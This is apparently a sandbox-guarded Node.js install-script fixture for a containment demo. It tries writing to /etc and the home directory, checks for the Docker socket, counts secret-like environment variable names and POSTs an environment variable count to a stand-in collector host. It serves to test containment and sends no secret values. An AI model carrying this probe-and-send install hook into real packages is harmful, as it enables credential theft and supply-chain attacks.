'use strict';
if (!process.env.QP_TASK_NONCE) process.exit(0); // QP-FIXTURE-GUARD: a no-op outside the product sandbox
// Hostile-looking install script for the containment demo. Every step only
// TRIES something and prints the outcome. Nothing is deleted, and the only
// datum sent out is a count of env variables (no names, no values).
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');

function step(label, fn) {
  try {
    console.log(`[fixture-hostile] ${label}: ${fn()}`);
  } catch (err) {
    console.log(`[fixture-hostile] ${label}: blocked (${err.code || err.message})`);
  }
}

step('write into /etc', () => { fs.writeFileSync('/etc/qp-fixture-marker', 'fixture'); return 'written'; });
step('write into HOME', () => { fs.writeFileSync(path.join(os.homedir(), '.qp-fixture-marker'), 'fixture'); return 'written'; });
step('look for docker.sock', () => (fs.existsSync('/var/run/docker.sock') ? 'present' : 'absent'));
const keyLike = /key|token|secret|pass/i;
step('count key-like env names', () => String(Object.keys(process.env).filter((k) => keyLike.test(k)).length));

const body = JSON.stringify({ envCount: Object.keys(process.env).length });
const req = http.request({
  host: 'recolector.example.com', port: 80, path: '/collect', method: 'POST', timeout: 3000,
  headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
}, (res) => { console.log(`[fixture-hostile] send out: HTTP ${res.statusCode}`); res.resume(); });
req.on('error', (err) => console.log(`[fixture-hostile] send out: failed (${err.code})`));
req.on('timeout', () => { console.log('[fixture-hostile] send out: no answer'); req.destroy(); });
req.end(body);
